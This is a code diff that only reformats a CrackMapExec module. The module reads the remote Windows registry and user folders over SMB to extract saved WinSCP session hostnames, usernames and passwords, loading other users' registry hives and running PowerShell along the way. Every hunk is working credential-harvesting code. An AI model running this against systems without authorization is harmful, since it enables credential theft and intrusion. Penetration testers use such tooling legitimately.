@@ -70,14 +70,11 @@ class CMEModule:
                 ans = rrp.hBaseRegOpenKey(
                     remoteOps._RemoteOperations__rrp,
                     regHandle,
-                    "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\"
-                    + userObject,
+                    "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\" + userObject,
                 )
                 keyHandle = ans["phkResult"]
 
-                userProfilePath = rrp.hBaseRegQueryValue(
-                    remoteOps._RemoteOperations__rrp, keyHandle, "ProfileImagePath"
-                )[1].split("\x00")[:-1][0]
+                userProfilePath = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "ProfileImagePath")[1].split("\x00")[:-1][0]
                 rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)
                 self.userDict[userObject] = userProfilePath.split("\\")[-1]
         finally:
@@ -144,24 +141,14 @@ class CMEModule:
             ans = rrp.hBaseRegOpenKey(
                 remoteOps._RemoteOperations__rrp,
                 regHandle,
-                userObject
-                + "\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\"
-                + sessionName,
+                userObject + "\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\" + sessionName,
             )
             keyHandle = ans["phkResult"]
 
-            hostName = unquote(
-                rrp.hBaseRegQueryValue(
-                    remoteOps._RemoteOperations__rrp, keyHandle, "HostName"
-                )[1].split("\x00")[:-1][0]
-            )
-            userName = rrp.hBaseRegQueryValue(
-                remoteOps._RemoteOperations__rrp, keyHandle, "UserName"
-            )[1].split("\x00")[:-1][0]
+            hostName = unquote(rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "HostName")[1].split("\x00")[:-1][0])
+            userName = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "UserName")[1].split("\x00")[:-1][0]
             try:
-                password = rrp.hBaseRegQueryValue(
-                    remoteOps._RemoteOperations__rrp, keyHandle, "Password"
-                )[1].split("\x00")[:-1][0]
+                password = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "Password")[1].split("\x00")[:-1][0]
             except:
                 context.log.debug("Session found but no Password is stored!")
                 password = ""
@@ -203,11 +190,7 @@ class CMEModule:
             # Get User Names
             userNames = []
             for i in range(users):
-                userNames.append(
-                    rrp.hBaseRegEnumKey(remoteOps._RemoteOperations__rrp, keyHandle, i)[
-                        "lpNameOut"
-                    ].split("\x00")[:-1][0]
-                )
+                userNames.append(rrp.hBaseRegEnumKey(remoteOps._RemoteOperations__rrp, keyHandle, i)["lpNameOut"].split("\x00")[:-1][0])
             rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)
 
             # Filter legit users in regex
@@ -247,11 +230,7 @@ class CMEModule:
 
             # Get User Names
             for i in range(users):
-                userObjects.append(
-                    rrp.hBaseRegEnumKey(remoteOps._RemoteOperations__rrp, keyHandle, i)[
-                        "lpNameOut"
-                    ].split("\x00")[:-1][0]
-                )
+                userObjects.append(rrp.hBaseRegEnumKey(remoteOps._RemoteOperations__rrp, keyHandle, i)["lpNameOut"].split("\x00")[:-1][0])
             rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)
         except:
             context.log.fail("Error handling Users in registry")
@@ -276,23 +255,18 @@ class CMEModule:
                 ans = rrp.hBaseRegOpenKey(
                     remoteOps._RemoteOperations__rrp,
                     regHandle,
-                    "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\"
-                    + userObject,
+                    "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\" + userObject,
                 )
                 keyHandle = ans["phkResult"]
 
-                userProfilePath = rrp.hBaseRegQueryValue(
-                    remoteOps._RemoteOperations__rrp, keyHandle, "ProfileImagePath"
-                )[1].split("\x00")[:-1][0]
+                userProfilePath = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "ProfileImagePath")[1].split("\x00")[:-1][0]
                 rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)
 
                 # Load Profile
                 ans = rrp.hOpenUsers(remoteOps._RemoteOperations__rrp)
                 regHandle = ans["phKey"]
 
-                ans = rrp.hBaseRegOpenKey(
-                    remoteOps._RemoteOperations__rrp, regHandle, ""
-                )
+                ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, "")
                 keyHandle = ans["phkResult"]
 
                 context.log.debug("LOAD USER INTO REGISTRY: " + userObject)
@@ -324,9 +298,7 @@ class CMEModule:
             for userObject in unloadedUserObjects:
                 context.log.debug("UNLOAD USER FROM REGISTRY: " + userObject)
                 try:
-                    rrp.hBaseRegUnLoadKey(
-                        remoteOps._RemoteOperations__rrp, keyHandle, userObject
-                    )
+                    rrp.hBaseRegUnLoadKey(remoteOps._RemoteOperations__rrp, keyHandle, userObject)
                 except:
                     traceback.print_exc()
             rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)
@@ -344,14 +316,11 @@ class CMEModule:
             ans = rrp.hBaseRegOpenKey(
                 remoteOps._RemoteOperations__rrp,
                 regHandle,
-                userObject
-                + "\\Software\\Martin Prikryl\\WinSCP 2\\Configuration\\Security",
+                userObject + "\\Software\\Martin Prikryl\\WinSCP 2\\Configuration\\Security",
             )
             keyHandle = ans["phkResult"]
 
-            useMasterPassword = rrp.hBaseRegQueryValue(
-                remoteOps._RemoteOperations__rrp, keyHandle, "UseMasterPassword"
-            )[1]
+            useMasterPassword = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "UseMasterPassword")[1]
             rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)
         finally:
             remoteOps.finish()
@@ -369,9 +338,7 @@ class CMEModule:
             self.userObjectToNameMapper(context, connection, allUserObjects)
 
             # Users which must be loaded into registry:
-            unloadedUserObjects = list(
-                set(userObjects).symmetric_difference(set(allUserObjects))
-            )
+            unloadedUserObjects = list(set(userObjects).symmetric_difference(set(allUserObjects)))
             self.loadMissingUsers(context, connection, unloadedUserObjects)
 
             # Retrieve how many sessions are stored in registry from each UserObject
@@ -386,24 +353,14 @@ class CMEModule:
                     )
                     keyHandle = ans["phkResult"]
 
-                    data = rrp.hBaseRegQueryInfoKey(
-                        remoteOps._RemoteOperations__rrp, keyHandle
-                    )
+                    data = rrp.hBaseRegQueryInfoKey(remoteOps._RemoteOperations__rrp, keyHandle)
                     sessions = data["lpcSubKeys"]
-                    context.log.success(
-                        'Found {} sessions for user "{}" in registry!'.format(
-                            sessions - 1, self.userDict[userObject]
-                        )
-                    )
+                    context.log.success('Found {} sessions for user "{}" in registry!'.format(sessions - 1, self.userDict[userObject]))
 
                     # Get Session Names
                     sessionNames = []
                     for i in range(sessions):
-                        sessionNames.append(
-                            rrp.hBaseRegEnumKey(
-                                remoteOps._RemoteOperations__rrp, keyHandle, i
-                            )["lpNameOut"].split("\x00")[:-1][0]
-                        )
+                        sessionNames.append(rrp.hBaseRegEnumKey(remoteOps._RemoteOperations__rrp, keyHandle, i)["lpNameOut"].split("\x00")[:-1][0])
                     rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)
                     sessionNames.remove("Default%20Settings")
 
@@ -414,17 +371,11 @@ class CMEModule:
                     for sessionName in sessionNames:
                         self.printCreds(
                             context,
-                            self.registrySessionExtractor(
-                                context, connection, userObject, sessionName
-                            ),
+                            self.registrySessionExtractor(context, connection, userObject, sessionName),
                         )
                 except DCERPCException as e:
                     if str(e).find("ERROR_FILE_NOT_FOUND"):
-                        context.log.debug(
-                            "No WinSCP config found in registry for user {}".format(
-                                userObject
-                            )
-                        )
+                        context.log.debug("No WinSCP config found in registry for user {}".format(userObject))
                 except Exception:
                     context.log.fail("Unexpected error:")
                     traceback.print_exc()
@@ -432,9 +383,7 @@ class CMEModule:
         except DCERPCException as e:
             # Error during registry query
             if str(e).find("rpc_s_access_denied"):
-                context.log.fail(
-                    "Error: rpc_s_access_denied. Seems like you don't have enough privileges to read the registry."
-                )
+                context.log.fail("Error: rpc_s_access_denied. Seems like you don't have enough privileges to read the registry.")
         except:
             context.log.fail("UNEXPECTED ERROR:")
             traceback.print_exc()
@@ -475,17 +424,11 @@ class CMEModule:
                 context.log.success("Found config file! Extracting credentials...")
                 self.decodeConfigFile(context, confFile)
             except:
-                context.log.fail(
-                    "Error! No config file found at {}".format(self.filepath)
-                )
+                context.log.fail("Error! No config file found at {}".format(self.filepath))
                 traceback.print_exc()
         else:
-            context.log.display(
-                "Looking for WinSCP creds in User documents and AppData..."
-            )
-            output = connection.execute(
-                'powershell.exe "Get-LocalUser | Select name"', True
-            )
+            context.log.display("Looking for WinSCP creds in User documents and AppData...")
+            output = connection.execute('powershell.exe "Get-LocalUser | Select name"', True)
             users = []
             for row in output.split("\r\n"):
                 users.append(row.strip())
@@ -503,15 +446,9 @@ class CMEModule:
                         buf = BytesIO()
                         connection.conn.getFile(self.share, path, buf.write)
                         confFile = buf.getvalue().decode()
-                        context.log.success(
-                            'Found config file at "{}"! Extracting credentials...'.format(
-                                self.share + path
-                            )
-                        )
+                        context.log.success('Found config file at "{}"! Extracting credentials...'.format(self.share + path))
                     except:
-                        context.log.debug(
-                            'No config file found at "{}"'.format(self.share + path)
-                        )
+                        context.log.debug('No config file found at "{}"'.format(self.share + path))
                     if confFile:
                         self.decodeConfigFile(context, confFile)
 
